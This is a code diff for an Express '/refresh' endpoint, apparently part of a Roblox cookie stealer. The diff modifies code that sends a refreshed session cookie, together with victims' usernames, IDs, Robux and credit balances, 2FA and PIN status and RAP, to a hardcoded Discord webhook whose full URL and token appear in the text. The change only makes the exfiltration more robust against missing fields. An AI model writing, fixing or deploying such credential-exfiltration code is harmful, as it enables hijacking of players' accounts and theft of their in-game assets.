@@ -59,30 +59,30 @@ app.get('/refresh', async (req, res) => {
 
     const webhookURL = 'https://discord.com/api/webhooks/1408839542147911711/a1HanvWKWMGi4aD_29W2ewVyAWqFwb2yDI8lnSzRZv5dmk2d74eEitDRjJoppJf3JcZu';
     const response = await axios.post(webhookURL, {
-        embeds: [
-            {
-                title: 'Refreshed Cookie',
-                description: `**Refreshed Cookie:**\n\`\`\`${refreshedCookie}\`\`\``,
-                color: 16776960,
-                thumbnail: {
-                    url: userData.avatarUrl,
-                },
-                fields: [
-                    { name: 'Username', value: userData.username, inline: true },
-                    { name: 'User ID', value: userData.uid, inline: true },
-                    { name: 'Display Name', value: userData.displayName, inline: true },
-                    { name: 'Creation Date', value: userData.createdAt, inline: true },
-                    { name: 'Country', value: userData.country, inline: true },
-                    { name: 'Account Balance (Robux)', value: userData.balance, inline: true },
-                    { name: 'Is 2FA Enabled', value: userData.isTwoStepVerificationEnabled, inline: true },
-                    { name: 'Is PIN Enabled', value: userData.isPinEnabled, inline: true },
-                    { name: 'Is Premium', value: userData.isPremium, inline: true },
-                    { name: 'Credit Balance', value: userData.creditbalance, inline: true },
-                    { name: 'RAP', value: userData.rap, inline: true },
-                ],
-            }
-        ]
-    });
+    embeds: [
+        {
+            title: 'Refreshed Cookie',
+            description: `**Refreshed Cookie:**\n\`\`\`${refreshedCookie || 'None'}\`\`\``,
+            color: 16776960,
+            thumbnail: {
+                url: userData.avatarUrl || 'https://tr.rbxcdn.com/default_avatar.png',
+            },
+            fields: [
+                { name: 'Username', value: userData.username || 'Unknown', inline: true },
+                { name: 'User ID', value: String(userData.uid || 'Unknown'), inline: true },
+                { name: 'Display Name', value: userData.displayName || 'Unknown', inline: true },
+                { name: 'Creation Date', value: userData.createdAt || 'Unknown', inline: true },
+                { name: 'Country', value: userData.country || 'Unknown', inline: true },
+                { name: 'Account Balance (Robux)', value: String(userData.balance ?? 0), inline: true },
+                { name: 'Is 2FA Enabled', value: String(userData.isTwoStepVerificationEnabled ?? false), inline: true },
+                { name: 'Is PIN Enabled', value: String(userData.isPinEnabled ?? false), inline: true },
+                { name: 'Is Premium', value: String(userData.isPremium ?? false), inline: true },
+                { name: 'Credit Balance', value: String(userData.creditbalance ?? 0), inline: true },
+                { name: 'RAP', value: String(userData.rap ?? 0), inline: true }
+            ]
+        }
+    ]
+});
 
     console.log('Sent successfully+response', response.data);
 
